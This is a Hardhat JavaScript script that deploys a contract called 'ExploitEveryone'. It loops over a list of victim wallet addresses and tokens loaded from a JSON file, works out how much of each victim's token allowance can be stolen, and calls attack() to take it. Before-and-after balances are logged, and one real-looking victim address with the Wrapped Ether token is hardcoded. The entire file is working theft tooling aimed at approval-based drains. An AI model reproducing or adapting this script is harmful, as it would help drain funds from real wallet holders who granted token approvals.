// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const hre = require("hardhat");
const helpers = require("@nomicfoundation/hardhat-network-helpers");
const fs = require('fs');

async function main() {
  //await helpers.reset("http://localhost:8545", 17003762);

  let accounts = await hre.ethers.getSigners(); 

  // Deploy the REAL DEAL!
  console.log("Deploy our Exploit contract")
  const exploit = await hre.ethers.getContractFactory("ExploitEveryone", accounts[0]);
  const exploitContract = await exploit.deploy();
  await exploitContract.deployed();

  // Iterate over a loop here
  let users = [{
    "victimAddress" : "0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1", 
    "victimToken" : "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
    "tokenName" : "Wrapped Ether"
  }];

  users = JSON.parse(fs.readFileSync("./exploit.json"));

  for (let i = 0; i < users.length; i++){

    console.log("\n\n------------------------"); 
    let victimAddress = users[i]['victimAddress']; 
    let victimToken = users[i]['victimToken']; 
    let tokenName = users[i]['tokenName']; 

    let balancesBefore = await exploitContract.getBalances(victimToken, exploitContract.address, victimAddress);

    // Calculate stealable funds
    let fundsToSteal = users[i]["victimBalance"] > users[i]["victimAllowance"] ? users[i]["victimAllowance"] : users[i]["victimBalance"];

    console.log("Balances before the hack...."); 
    console.log(`Attacker ${tokenName} Balance: `, balancesBefore[0].toString());
    console.log(`${victimAddress} ${tokenName} Balance: `, balancesBefore[1].toString());
    console.log(`Victim allowance ${users[i]["victimAllowance"]}`); 
    console.log("Balance to Steal...", fundsToSteal); 


    /*
    Run the exploit code to steal the funds
    */
    console.log("Launch the attack!");
    let attackResponse = await exploitContract.attack(victimToken, victimAddress);
    const attackReceipt = await attackResponse.wait(1);

    let balancesAfter = await exploitContract.getBalances(victimToken, exploitContract.address, victimAddress);
    console.log("Balances AFTER the hack...."); 
    console.log(`Attacker ${tokenName} Balance: `, balancesAfter[0].toString());
    console.log(`${victimAddress} ${tokenName} Balance: `, balancesAfter[1].toString());

    // Check if this was successful
    if(balancesAfter[0].gt(balancesBefore[0])){
      console.log("Exploit successful!\n");
    }
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
